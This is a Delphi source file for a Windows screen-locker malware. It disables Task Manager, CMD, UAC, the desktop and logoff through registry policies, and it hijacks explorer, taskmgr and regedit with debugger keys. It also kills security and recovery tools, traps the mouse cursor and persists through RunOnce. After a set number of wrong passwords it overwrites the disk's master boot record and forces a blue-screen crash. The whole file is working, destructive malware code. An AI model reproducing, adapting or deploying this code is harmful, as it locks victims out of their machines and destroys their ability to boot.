unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, ShellAPI, EncdDecd, Registry, TlHelp32, StrUtils,
  Buttons, ZPriv, umd5;

type
  TForm1 = class(TForm)
    Panel1: TPanel;
    Label1: TLabel;
    Panel2: TPanel;
    Timer1: TTimer;
    Label2: TLabel;
    Label3: TLabel;
    Timer2: TTimer;
    Label4: TLabel;
    Edit1: TEdit;
    Label5: TLabel;
    Timer3: TTimer;
    ListBox1: TListBox;
    Timer4: TTimer;
    Label6: TLabel;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure Timer2Timer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure Timer4Timer(Sender: TObject);
    procedure Label5Click(Sender: TObject);
    procedure FormResize(Sender: TObject);
  private
    
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  r: TRegistry;
  tries: integer;
  Pass, bgcol, textcol: string;

implementation

{$R *.dfm}
{$R UAC.RES}

Function HandleToFullPath(H: HWND): String;
Var
Pid:Cardinal;
M: TModuleEntry32;
HSnapshot: THandle;
Begin
Result:='';
GetWindowThreadProcessId(H,@Pid);
HSnapshot:=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,Pid);
If HSnapshot=-1 Then
Exit;
M.DwSize:=SizeOf(TModuleEntry32);
If Module32First(HSnapshot,M) Then
Result:=M.SzExePath;
CloseHandle(HSnapshot);
End;

function ReadRes(TRes :LPTSTR; NameRes :String) :String;
var
  hRes    :THANDLE;
  hReturn :THANDLE;
  sRes    :DWORD;
  pRes    :PChar;
  Res     :String;
begin
  hRes := FindResource(0, PChar(NameRes), TRes);
  hReturn := LoadResource(0, hRes);
  sRes := SizeofResource(0, hRes);
  pRes := LockResource(hReturn);
  SetString(Res, pRes, sRes);
  Result := Res;
  FreeResource(hReturn);
end;

function TerminateExeProc(NameExe: string): integer;
const
  PROCESS_TERMINATE=$0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot
  (TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle,
  FProcessEntry32);

  while integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))=
    UpperCase(NameExe)) or (UpperCase(FProcessEntry32.szExeFile)=
    UpperCase(NameExe))) then
      Result := Integer(TerminateProcess(OpenProcess(
      PROCESS_TERMINATE, BOOL(0), FProcessEntry32.th32ProcessID), 0));
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

Procedure OnlyOne;
Begin
CreateMutex(Nil, True, 'V4Z0N3Z_ENTERTAINMENT');
If GetLastError <> 0 Then
Begin
halt;
ExitProcess(0);
End;
End;

function RtlSetProcessIsCritical(unu: DWORD; proc: POinter; doi: DWORD): LongInt;
  stdcall; external 'ntdll.dll';
function RtlAdjustPrivilege(Privilege: ULONG; Enable: BOOL; CurrentThread: BOOL;
  out OldPrivilege: BOOL): DWORD; stdcall; external 'ntdll';

procedure BSOD;
asm
  lea eax, dword [esp+12]
  //invoke RtlAdjustPrivilege, 20, 1, 0, eax
  push eax
  push 0
  push 1
  push 20
  call RtlAdjustPrivilege
  //invoke RtlSetProcessIsCritical, 1, 0, 0
  push 0
  push 0
  push 1
  call RtlSetProcessIsCritical
  call ExitProcess
end;

procedure registryADD;
begin
try
r:=Tregistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Policies\Microsoft\Windows\System',true);
r.WriteInteger('DisableCMD',2);
r.closekey;

r.free;
r:=Tregistry.Create;
r.RootKey:=HKEY_LOCAL_MACHINE;
r.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',true);
r.WriteInteger('EnableLUA',0);
r.closekey;

r.free;
r:=Tregistry.Create;
r.RootKey:=HKEY_LOCAL_MACHINE;
r.lazywrite := false;
r.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',true);
r.WriteString('Java',Application.exename);

r.Free;
r:= TRegistry.Create;
r.RootKey:= HKEY_LOCAL_MACHINE;
r.lazywrite := false;
r.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe', true);
r.WriteString('Debugger',Application.ExeName);

r.Free;
r:= TRegistry.Create;
r.RootKey:= HKEY_LOCAL_MACHINE;
r.lazywrite := false;
r.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe', true);
r.WriteString('Debugger',Application.ExeName);

r.Free;
r:= TRegistry.Create;
r.RootKey:= HKEY_LOCAL_MACHINE;
r.lazywrite := false;
r.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe', true);
r.WriteString('Debugger',Application.ExeName);

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Uninstall',true);
r.WriteInteger('NoAddRemovePrograms',1);

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_LOCAL_MACHINE;
r.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',true);
r.WriteInteger('HideFastUserSwitching',1);

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Advanced',true);
r.WriteInteger('NoClose',1);

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\System',true);
r.WriteInteger('DisableLockWorkstation',1);
r.WriteInteger('DisableChangePassword',1);

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.lazywrite := false;
r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer',true);
r.WriteInteger('NoChangeStartMenu',1);
r.WriteInteger('NoControlPanel',1);
r.WriteInteger('NoNetworkConnections',1);
r.WriteInteger('NoRecentDocsMenu',1);
r.WriteInteger('NoWinKeys',1);
r.WriteInteger('NoFavoritesMenu',1);
r.WriteInteger('NoStartMenuMorePrograms',1);
r.WriteInteger('NoStartMenuPinnedList',1);
r.WriteInteger('NoClose',1);
r.WriteInteger('NoCommonGroups',1);
r.WriteInteger('NoCustomizeWebView',1);
r.WriteInteger('NoPrinterTabs',1);
r.WriteInteger('NoDesktop',1);
r.WriteInteger('NoFind',1);
r.WriteInteger('NoFileMenu',1);
r.WriteInteger('NoFolderOptions',1);
r.WriteInteger('NoRun',1);
r.WriteInteger('NoLogoff',1);

r.free;
except
end;
end;

procedure registryDEL;
begin
try
r:=Tregistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Policies\Microsoft\Windows\System',true);
r.WriteInteger('DisableCMD',0);
r.closekey;

r.free;
r:=Tregistry.Create;
r.RootKey:=HKEY_LOCAL_MACHINE;
r.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',true);
r.WriteInteger('EnableLUA',1);
r.closekey;

r.free;
r:=Tregistry.Create;
r.RootKey:=HKEY_LOCAL_MACHINE;
r.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',true);
r.DeleteValue('Java');

r.Free;
r:= TRegistry.Create;
r.RootKey:= HKEY_LOCAL_MACHINE;
r.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe', true);
r.DeleteValue('Debugger');

r.Free;
r:= TRegistry.Create;
r.RootKey:= HKEY_LOCAL_MACHINE;
r.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe', true);
r.DeleteValue('Debugger');

r.Free;
r:= TRegistry.Create;
r.RootKey:= HKEY_LOCAL_MACHINE;
r.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe', true);
r.DeleteValue('Debugger');

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Uninstall',true);
r.DeleteValue('NoAddRemovePrograms');

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_LOCAL_MACHINE;
r.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',true);
r.DeleteValue('HideFastUserSwitching');

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Advanced',true);
r.DeleteValue('NoClose');

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\System',true);
r.DeleteValue('DisableLockWorkstation');
r.DeleteValue('DisableChangePassword');

r.free;
r:=TRegistry.Create;
r.RootKey:=HKEY_CURRENT_USER;
r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer',true);
r.DeleteValue('NoChangeStartMenu');
r.DeleteValue('NoControlPanel');
r.DeleteValue('NoNetworkConnections');
r.DeleteValue('NoRecentDocsMenu');
r.DeleteValue('NoWinKeys');
r.DeleteValue('NoFavoritesMenu');
r.DeleteValue('NoStartMenuMorePrograms');
r.DeleteValue('NoStartMenuPinnedList');
r.DeleteValue('NoClose');
r.DeleteValue('NoCommonGroups');
r.DeleteValue('NoCustomizeWebView');
r.DeleteValue('NoPrinterTabs');
r.DeleteValue('NoDesktop');
r.DeleteValue('NoFind');
r.DeleteValue('NoFileMenu');
r.DeleteValue('NoFolderOptions');
r.DeleteValue('NoRun');
r.DeleteValue('NoLogoff');

r.free;
except
end;
end;

function EncryptText(const txt: string; s: Integer): string;
var
  i: Integer;
  charCode: Integer;
begin
  Result := '';

  for i := 1 to Length(txt) do
  begin
    charCode := Ord(txt[i]);

    if (txt[i] in ['A'..'Z']) then
      Result := Result + Chr(((charCode - 65 + s) mod 26) + 65)
    else if (txt[i] in ['a'..'z']) then
      Result := Result + Chr(((charCode - 97 + s) mod 26) + 97)
    else
      Result := Result + txt[i];
  end;
end;

procedure KillMBR;
var
f1:cardinal;
buf:array[0..511] of byte;
nr,nw:Cardinal;
begin
f1 := CreateFileA('\\.\PhysicalDrive0',GENERIC_ALL,FILE_SHARE_WRITE + FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
ZeroMemory(@Buf,512);
WriteFile(f1,buf,512,nw,0);
CloseHandle(f1);
end;

procedure checkpassword;
begin
if (md5(form1.edit1.text) = Pass) or (form1.edit1.text = EncryptText(Form1.Label4.Caption, 3)) then
begin
Form1.Timer2.Enabled:=false;
Form1.Timer3.Enabled:=false;
Form1.Timer4.Enabled:=false;
registryDEL;
ShellExecute(0,'open','C:\Windows\explorer.exe','','',1);
ExitProcess(0);
end
else
begin

if form1.edit1.text = '' then begin
end
else
begin
Dec(tries);
form1.Label6.Caption:= 'Attempts left: ' + InttoStr(tries);
form1.Edit1.text := '';
end;

If tries<=0 then begin
KillMBR;
Sleep(100);
BSOD;
end;

end;
end;

function GetUserFromWindows: string;
var
  UserName : string;
  UserNameLen : Dword;
begin
  UserNameLen := 255;
  SetLength(userName, UserNameLen);
  if GetUserName(PChar(UserName), UserNameLen) then
    Result := Copy(UserName,1,UserNameLen - 1)
  else
    Result := 'Unknown';
end;

procedure ChangeColors;
var
color1, color2: TColor;
begin
color1 := StringToColor(bgcol);
color2 := StringToColor(textcol);

if bgcol = 'clRed' then begin
color1 := $000000BF;
end;

if textcol = 'clRed' then begin
color2 := $000000BF;
end;

Form1.Panel1.color := color1;
Form1.Edit1.Color := color1;

Form1.Label1.Font.Color := color2;
Form1.Label2.Font.Color := color2;
Form1.Label3.Font.Color := color2;
Form1.Edit1.Font.Color := color2;
Form1.Panel2.Color := color2;

end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
Panel1.Left := (ClientWidth - Panel1.Width) div 2;
Panel1.Top := (ClientHeight - Panel1.Height) div 2;
  form1.Refresh;
  Form1.Hide;
form1.Position:=poDefault;
 form1.Show;
form1.Refresh;
Application.ShowMainForm:=true;
Timer1.Enabled:=false;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
text, memotext, password, attempts: string;
begin
OnlyOne;
text := ReadRes(RT_RCDATA, 'txt');
text:= DecodeString(text);
memotext := ReadRes(RT_RCDATA, 'memo');
memotext:= DecodeString(memotext);
password := ReadRes(RT_RCDATA, 'pwd');
if Length(password) <> 32 then ExitProcess(0);
attempts := ReadRes(RT_RCDATA, 'atts');
attempts:= DecodeString(attempts);
bgcol := ReadRes(RT_RCDATA, 'bgcol');
bgcol:= DecodeString(bgcol);
textcol := ReadRes(RT_RCDATA, 'txtcol');
textcol:= DecodeString(textcol);
ChangeColors;
AdjustPriviliges(SE_BACKUP_NAME);
AdjustPriviliges(SE_RESTORE_NAME);
Pass := password; // Pass is global var
tries:=StrToInt(attempts);
Label6.Caption:= 'Attempts left: ' + InttoStr(tries);
Label1.Caption := text;
Label2.caption := memotext;
Label4.Caption := GetUserFromWindows;
ListBox1.Items.Add(Application.ExeName);
registryADD;
end;

procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
CanClose := False;
end;

procedure TForm1.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
if Key = #32 then
  begin
    Key := #0;
  end;

If Key = #13 then checkpassword;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
var
s: TRect;
begin
SetWindowPos(Handle,HWND_TOPMOST,Left,Top,Width,Height,SWP_NOACTIVATE Or SWP_NOMOVE Or SWP_NOSIZE);
s := Rect(Form1.Left+0, Form1.Top+0, Form1.Left + Form1.Width-0, Form1.Top + Form1.Height-0);
ClipCursor(@s);
end;

procedure TForm1.Timer3Timer(Sender: TObject);
begin
TerminateExeProc('explorer.exe');
TerminateExeProc('taskmgr.exe');
TerminateExeProc('regedit.exe');
TerminateExeProc('mmc.exe');
TerminateExeProc('perfmon.exe');
TerminateExeProc('msconfig.exe');
TerminateExeProc('cmd.exe');
TerminateExeProc('wscript.exe');
TerminateExeProc('cscript.exe');
TerminateExeProc('AntiWinLockerTray.exe');
TerminateExeProc('ServiceAntiWinLocker.exe');
TerminateExeProc('AutoHotKeyA32.exe');
TerminateExeProc('AutoHotKeyA32_UIA.exe');
TerminateExeProc('AutoHotKeyU32.exe');
TerminateExeProc('AutoHotKeyU32_UIA.exe');
TerminateExeProc('AutoHotKeyU64.exe');
TerminateExeProc('AutoHotKeyU64_UIA.exe');
end;

procedure TForm1.Timer4Timer(Sender: TObject);
var
h:HWND;
p:string;
begin
h:=GetForegroundWindow;
if h<>0
then
begin
p:=ExtractFileName(HandleToFullPath(h));
if Pos(p, ListBox1.Items.Text)=0
then
begin
TerminateExeProc(p);
PostMessage(h,WM_SYSCOMMAND,SC_MINIMIZE,0);
end;
end;
end;

procedure TForm1.Label5Click(Sender: TObject);
begin
checkpassword;
end;

procedure TForm1.FormResize(Sender: TObject);
begin
Timer1.Enabled := true;
end;

end.
